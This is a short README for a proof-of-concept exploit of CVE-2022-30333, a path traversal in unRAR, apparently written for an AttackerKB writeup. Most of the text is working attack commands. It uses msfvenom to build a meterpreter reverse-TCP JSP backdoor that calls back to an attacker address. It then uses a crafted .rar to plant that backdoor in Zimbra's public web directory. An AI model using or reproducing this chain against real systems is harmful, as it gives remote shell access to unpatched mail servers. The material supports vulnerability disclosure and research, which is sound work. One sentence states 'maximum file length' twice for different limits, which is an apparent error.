A proof of concept for CVE-2022-30333 - a path traversal vulnerability in unRAR
versions prior to 6.11. I created this as a demonstration of the exploit for
an AttackerKB writeup, and hope to incorporate it in a Metasploit Module soon!

Basically, you provide a target (including path traversal) and some file data,
and this tool will generate a .rar that will extract that file to that location.
The maximum file length is 104 bytes, and the maximum file length is 4096 bytes.
(That's not intrinsic to the vulnerability, it's just what I chose when I
generated the file).

For example, generate a backdoor with `msfvenom`:

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.146 -f jsp -o payload.jsp
```

Then create a .rar file, planting the .jsp somewhere fun:

```
$ ruby ./cve-2022-30333.rb '../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/backdoor.jsp' ./payload.jsp > file.rar
```
